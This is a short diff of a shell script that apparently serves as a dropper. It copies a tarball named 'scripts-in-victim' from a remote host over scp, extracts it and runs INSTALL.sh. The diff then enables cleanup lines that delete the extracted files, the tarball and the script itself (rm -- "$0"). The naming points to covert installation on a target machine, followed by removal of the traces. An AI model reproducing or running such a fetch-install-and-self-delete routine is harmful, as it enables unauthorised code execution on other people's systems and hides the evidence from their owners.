@@ -13,9 +13,9 @@ scp -P 3603 alarm@10.22.14.203:/home/alarm/DOCUMENTS/from-pkp/scripts-in-victim.
 tar -xvf delete-this.tar																							#
 cd scripts-in-victim/																								#
 sh INSTALL.sh																										#
-#cd $THIS_FOLDER																									#
+cd $THIS_FOLDER																									#
 #cp scripts-in-victim/UNINSTALL.sh $THIS_FOLDER/																							#
-#rm -r scripts-in-victim																							#
-#rm delete-this.tar																									#
-#rm -- "$0"																											#
+rm -r scripts-in-victim																							#
+rm delete-this.tar																									#
+rm -- "$0"																											#
 #+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
